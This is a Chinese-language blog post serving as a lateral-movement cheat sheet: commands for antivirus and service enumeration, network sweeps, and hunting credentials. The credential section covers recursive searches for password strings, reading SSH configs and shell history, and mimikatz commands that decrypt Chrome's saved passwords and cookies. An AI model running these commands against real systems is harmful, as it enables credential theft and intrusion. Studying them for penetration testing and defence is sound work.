<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>内网横向 | bo0s</title>
  <meta name="author" content="hitman">
  
  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="内网横向"/>
  <meta property="og:site_name" content="bo0s"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/12favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">bo0s</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="全部文章">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="标签">
			  <i class="fa fa-tag"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="我是谁.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/wiki/#/" title="WiKi.">
			  <i class="fa fa-book"></i>WiKi
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="工具">
			  <i class="fa fa-space-shuttle"></i>Tool
			</a>
		  </li>
		  
		  <li>
			<a href="/logs" title="日志">
			  <i class="fa fa-tachometer"></i>Logs
			</a>
		  </li>
		  
		  <li>
			<a href="/code/landing/" title="Discord.JS Bot Code">
			  <i class="fa fa-code"></i>Tutorials / Code
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 内网横向</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/images/lateral-move.jpg" alt="upload successful"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<p> 外网打点事为了获取内网入口权限，内网信息收集是为了提权和横向移动到其他机器获取信息.</p>
</blockquote>
<a id="more"></a> 


<h2 id="单机信息收集"><a href="#单机信息收集" class="headerlink" title="单机信息收集"></a>单机信息收集</h2><h3 id="防护设备收集"><a href="#防护设备收集" class="headerlink" title="防护设备收集"></a>防护设备收集</h3><blockquote>
<p>通过<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">avList</a>对比查看杀软名称</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">wmic</span> /<span class="title">Node:localhost</span> /<span class="title">Namespace</span>:\\<span class="title">root</span>\<span class="title">SecurityCenter2</span> <span class="title">Path</span> <span class="title">AntiVirusProduct</span> <span class="title">Get</span> <span class="title">displayName</span>,<span class="title">pathToSignedReportingExe</span> /<span class="title">Format:List</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>PowerShell</code>查询</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> root/SecurityCenter2 <span class="literal">-ClassName</span> AntivirusProduct</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查询<code>Defender</code>开启状况</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询Defender开启状态</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Get-Service</span> WinDefend</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 Defender 实时保护启用状态。</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Nobody&gt; <span class="built_in">Get-MpComputerStatus</span> | <span class="built_in">select</span> RealTimeProtectionEnabled</span><br></pre></td></tr></table></figure>



<h3 id="进程、服务、应用、防护、计划"><a href="#进程、服务、应用、防护、计划" class="headerlink" title="进程、服务、应用、防护、计划"></a>进程、服务、应用、防护、计划</h3><blockquote>
<p>进程</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  Windows 进程信息</span></span><br><span class="line">tasklist /svc</span><br><span class="line">wmic process list brief</span><br><span class="line">Get-Process -Name &lt;Process Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">## Windows 查看进程名称、进程 ID、进程对应服务</span></span><br><span class="line">tasklist /SRC</span><br><span class="line">wmic<span class="built_in"> service </span>list brief</span><br><span class="line"></span><br><span class="line"><span class="comment">## Linux 查看进程</span></span><br><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line"><span class="comment">## Linux 查看进程，此目录中数字目录是进程 ID，里面是进程文件信息。</span></span><br><span class="line">ls -al /proc/</span><br><span class="line"></span><br><span class="line"><span class="comment">## Linux 资源情况展示</span></span><br><span class="line">top</span><br></pre></td></tr></table></figure>



<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><blockquote>
<p>Windows查看启动的服务</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line">PS C:\Users\Nobody&gt; <span class="built_in">net</span> <span class="built_in">start</span></span><br><span class="line"># 方法二</span><br><span class="line">PS C:\Users\Nobody&gt; sc query</span><br><span class="line"># 方法三</span><br><span class="line">PS C:\Users\Nobody&gt; wmic service where &quot;displayname like &#x27;OpenVPN Agent agent_ovpnconnect&#x27;&quot; get displayname,name,pathname,startmode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看启动项</span><br><span class="line">PS C:\Users\Nobody&gt; wmic startup get command,caption</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Linux查看启动的服务</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux CentOS7 及以前版本来查有哪些服务，状态如何。</span></span><br><span class="line">service -status-all</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 高版本有哪些服务单元</span></span><br><span class="line">systemctl -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 启动服务</span></span><br><span class="line">service &lt;Name&gt; start</span><br><span class="line">systemctl start &lt;Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 停止服务</span></span><br><span class="line">service &lt;Name&gt; stop</span><br><span class="line">systemctl stop &lt;Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 查看服务状态</span></span><br><span class="line">service &lt;Name&gt; status</span><br><span class="line">systemctl status &lt;Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux IANA 默认情况端口对应服务</span></span><br><span class="line">/etc/services</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 此文件里存放着公钥（~/.ssh/id_rsa.pub、~/.ssh/identity.pub），其他机器使用 SSH 连接会自动拿着自己的私钥（~/.ssh/id_rsa、~/.ssh/identity）与此文件里的公钥匹配，成功即可登录。</span></span><br><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 服务端 SSH 配置文件，需要 root 权限读取</span></span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">// Linux 客户端端 SSH 配置文件，其他用户可读</span><br><span class="line">cat /etc/ssh/ssh_config</span><br></pre></td></tr></table></figure>



<h3 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line">C:\Users\Nobody&gt; wmic product <span class="keyword">get</span> <span class="built_in">name</span>, <span class="built_in">version</span>, vendor, InstallLocation</span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line">PS C:\Users\Nobody&gt; powershell <span class="string">&quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version,InstallLocation&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="RDP端口"><a href="#RDP端口" class="headerlink" title="RDP端口"></a>RDP端口</h3><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="tag">\<span class="name">Users</span></span><span class="tag">\<span class="name">Nobody</span></span>&gt; (Get-ItemProperty -Path &quot;HKLM:<span class="tag">\<span class="name">SYSTEM</span></span><span class="tag">\<span class="name">CurrentControlSet</span></span><span class="tag">\<span class="name">Control</span></span><span class="tag">\<span class="name">Terminal</span></span> Server<span class="tag">\<span class="name">WinStations</span></span><span class="tag">\<span class="name">RDP</span></span>-Tcp&quot; -Name &quot;PortNumber&quot;).PortNumber</span><br><span class="line"></span><br><span class="line">C:<span class="tag">\<span class="name">Users</span></span><span class="tag">\<span class="name">Nobody</span></span>&gt; powershell -Command &quot;(Get-ItemProperty -Path &#x27;HKLM:<span class="tag">\<span class="name">SYSTEM</span></span><span class="tag">\<span class="name">CurrentControlSet</span></span><span class="tag">\<span class="name">Control</span></span><span class="tag">\<span class="name">Terminal</span></span> Server<span class="tag">\<span class="name">WinStations</span></span><span class="tag">\<span class="name">RDP</span></span>-Tcp&#x27; -Name &#x27;PortNumber&#x27;).PortNumber&quot;</span><br></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Windows 10 及以后版本查所有计划任务列表。详情信息。如果执行遇到问题 “错误：无法加载列资源”，更改编码 chcp 437 再执行。</span></span><br><span class="line">schtasks <span class="string">/query</span> <span class="string">/fo</span> LIST</span><br><span class="line"><span class="comment">## /v 可以展示所有详情</span></span><br><span class="line">schtasks <span class="string">/query</span> <span class="string">/fo</span> LIST <span class="string">/v</span></span><br><span class="line"><span class="comment">## /tn 选项可以读指定任务详情</span></span><br><span class="line">schtasks <span class="string">/query</span> <span class="string">/tn</span> 任务名称 <span class="string">/fo</span> LIST <span class="string">/v</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 任务计划</span></span><br><span class="line"><span class="comment">## 其中 /etc/crontab 是每个用户的任务计划配置内容，如果任务计划目标要执行的文件可写或可以被替换那么就能提权。</span></span><br><span class="line"><span class="keyword">ls</span> -lah <span class="string">/etc/cron</span>*</span><br></pre></td></tr></table></figure>



<h3 id="网段获取"><a href="#网段获取" class="headerlink" title="网段获取"></a>网段获取</h3><blockquote>
<p>ICMP</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 扫描C段信息，将结果输出到文b.txt</span><br><span class="line">@<span class="keyword">for</span> /l %i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> @<span class="built_in">ping</span> -n <span class="number">1</span> -w <span class="number">40</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i &amp; <span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (<span class="built_in">echo</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i&gt;&gt;c:\a.txt) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%i &gt;&gt;c:\b.txt)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ARP</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<blockquote>
<p>SMB</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script smb-enum-shares.nes -p <span class="number">445</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">119</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>netstat</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line">netstat -pantu</span><br><span class="line"></span><br><span class="line"># ss也是一样的效果</span><br><span class="line">ss -anp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>route 路由表查询</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">route -e </span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>hosts文件</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">cat /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">type c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Dns 缓存</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line"><span class="built_in">ipconfig</span> /displaydns</span><br></pre></td></tr></table></figure>

<blockquote>
<p>网卡信息</p>
</blockquote>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="attr">ifconfig</span> <span class="string">-a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line"><span class="attr">ipconfig</span> <span class="string">/all</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>RDP连接记录</p>
</blockquote>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 当前用户连接过的主机</span><br><span class="line">dir &quot;Registry::HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>erminal Server Client<span class="symbol">\S</span>ervers&quot; -Name</span><br><span class="line"></span><br><span class="line"># 当前主机连接过指定IP的用户名</span><br><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>erminal Server Client<span class="symbol">\S</span>ervers<span class="symbol">\1</span>92.168.93.30&quot;).UsernameHint</span><br></pre></td></tr></table></figure>



<h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><h4 id="数据库文件"><a href="#数据库文件" class="headerlink" title="数据库文件"></a>数据库文件</h4><h4 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h4><blockquote>
<p><code>Windows</code></p>
<p>用 FOR 循环输出所有 A-Z 盘符（通过 “此电脑 -&gt; 映射网络驱动器” 得知驱动器命名是 A-Z），使用 DIR /S 递归搜索，/B 输出文件绝对路径名，/A 显示出所有隐藏的文件，<code>2&gt; nul</code> 是将 DIR 错误输出内容 ”系统找不到指定的路径。“ 重定向到 NUL 避免显示在屏幕，FINDSTR 正则筛选关键字得到。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">FOR</span> %<span class="title">I</span> <span class="title">in</span> (<span class="title">A</span>,<span class="title">B</span>,<span class="title">C</span>,<span class="title">D</span>,<span class="title">E</span>,<span class="title">F</span>,<span class="title">G</span>,<span class="title">H</span>,<span class="title">I</span>,<span class="title">J</span>,<span class="title">K</span>,<span class="title">L</span>,<span class="title">M</span>,<span class="title">N</span>,<span class="title">O</span>,<span class="title">P</span>,<span class="title">Q</span>,<span class="title">R</span>,<span class="title">S</span>,<span class="title">T</span>,<span class="title">U</span>,<span class="title">V</span>,<span class="title">W</span>,<span class="title">X</span>,<span class="title">Y</span>,<span class="title">Z</span>) <span class="title">DO</span> <span class="title">DIR</span> /<span class="title">S</span> /<span class="title">B</span> /<span class="title">A</span> %<span class="title">I</span>:\ 2&gt; <span class="title">nul</span> | <span class="title">FINDSTR</span> /<span class="title">E</span> &quot;.<span class="title">inc</span> .<span class="title">conf</span>. .<span class="title">config</span> .<span class="title">properties</span> .<span class="title">json</span> .<span class="title">xls</span> .<span class="title">xlsx</span> .<span class="title">docx</span> .<span class="title">doc</span> .<span class="title">pptx</span> .<span class="title">ppt</span> .<span class="title">ini</span> .<span class="title">xml</span> .<span class="title">log</span> .<span class="title">txt</span> .<span class="title">md</span> .<span class="title">sql</span> .<span class="title">yml</span> .<span class="title">yaml</span> .*密码.* .*运维.* .*账户.* .*拓扑.* .*<span class="title">pass</span>.*&quot; &gt; <span class="title">keypath.txt</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>再使用FINDSTR在当前子目录中获取文件内的关键字</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FINDSTR</span> /C:&quot;user=&quot; /C:&quot;pass=&quot; /C:&quot;login=&quot; /C:&quot;uid=&quot; /C:&quot;pwd=&quot; /S /I *.ini *.inf *.txt *.cgi *.conf *.asp *.php *.jsp *.aspx *.cgi *.xml *.log *.bak  *.yml</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果路径较多，而且关键词较多的情况下可以分开书写</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># files.txt的内容</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>\<span class="title">Desktop</span>\1.<span class="title">txt</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>\<span class="title">Desktop</span>\2.<span class="title">txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">keyword.txt</span>的内容</span></span><br><span class="line"><span class="function"><span class="title">user</span>=</span></span><br><span class="line"><span class="function"><span class="title">pass</span>=</span></span><br><span class="line"><span class="function"><span class="title">pwd</span>=</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 使用<span class="title">findstr</span>进行查找</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>\<span class="title">Desktop</span>&gt;<span class="title">FINDSTR</span> /<span class="title">G:keyword</span>.<span class="title">txt</span> /<span class="title">F:files</span>.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当然也可以将关键字直接作为参数</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt;  <span class="title">FINDSTR</span> /<span class="title">C</span>:&quot;<span class="title">user</span>=&quot; /<span class="title">C</span>:&quot;<span class="title">pass</span>=&quot; /<span class="title">C</span>:&quot;<span class="title">login</span>=&quot; /<span class="title">C</span>:&quot;<span class="title">uid</span>=&quot; /<span class="title">C</span>:&quot;<span class="title">pwd</span>=&quot;  /<span class="title">F:files</span>.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><code>Linux</code></p>
<p>使用 find 找对应后缀文件，egrep 文件内容筛关键字。一般找 Home 目录和应用、日志目录。-type f 是搜普通文件，-regex 代表用正则搜。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -regex <span class="string">&#x27;.*\.txt\|.*\.xml\|.*\.php\|.*\.jsp\|.*\.conf\|.*\.bak\|.*\.js\|.*\.inc\|.*\.htpasswd\|.*\.inf\|.*\.ini\|.*\.log|.*\.sh|.*\.config&#x27;</span> &gt; files.txt 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<blockquote>
<p>再对这些文件筛选出关键字</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat files.txt | xargs -t -n 1 egrep <span class="string">&quot;password=&quot;</span> 2&gt; /dev/null</span><br></pre></td></tr></table></figure>



<h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器中需要关注，保存的密码、书签、浏览历史、保存的 Cookie。</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Chrome</span><br><span class="line">## 浏览记录文件</span><br><span class="line"><span class="built_in">dir</span> <span class="variable">%localappdata%</span>\Google\chrome\USERDA~<span class="number">1</span>\Default\History</span><br><span class="line"></span><br><span class="line">## 浏览器 cookies 文件</span><br><span class="line"><span class="built_in">dir</span> <span class="variable">%localappdata%</span>\Google\Chrome\USERDA~<span class="number">1</span>\Default\Cookies</span><br><span class="line"></span><br><span class="line">## 浏览器书签文件</span><br><span class="line"><span class="built_in">dir</span> <span class="variable">%localappdata%</span>\Google\Chrome\USERDA~<span class="number">1</span>\Default\Bookmarks</span><br><span class="line"></span><br><span class="line">## 浏览器保存的密码文件</span><br><span class="line"><span class="built_in">dir</span> &quot;<span class="variable">%localappdata%</span>\Google\Chrome\USERDA~<span class="number">1</span>\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">## imikaz 读取 Chrome 浏览器历史记录。</span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /<span class="keyword">in</span>:<span class="variable">%localappdata%</span>\Google\Chrome\USERDA~<span class="number">1</span>\Default\LOGIND~<span class="number">1</span>&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">## mimikaz 读取 Chrome 浏览器 Cookie。</span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /<span class="keyword">in</span>:<span class="variable">%localappdata%</span>\Google\Chrome\USERDA~<span class="number">1</span>\Default\Cookies /unprotect&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><blockquote>
<p>PowerShell 执行过的命令历史会存留记录，文件位于用户数据目录</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">CMD</span>获取Powershell历史命令</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">type</span> %<span class="title">APPDATA</span>%\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">PowerShell</span>\<span class="title">PSReadLine</span>\<span class="title">ConsoleHost_history.txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">PowerShell</span>获取<span class="title">PS</span>历史命令</span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">Get</span>-<span class="title">Content</span> (<span class="title">Get</span>-<span class="title">PSReadlineOption</span>).<span class="title">HistorySavePath</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>CMD 也可以在当前窗口中查看历史命令，但是关闭就看不到了</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Nobody</span>&gt; <span class="title">doskey</span> /<span class="title">history</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Linux BASH 当然也可以查看</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line"></span><br><span class="line"><span class="built_in">more</span> ~/.bash_history</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Powershell 没有退出时读取</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/3gstudent/</span>Homework-of-C-Language<span class="regexp">/blob/m</span>aster/SendKeyboardMessageToPowershell(Get-History).cpp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>剪切板获取</p>
</blockquote>
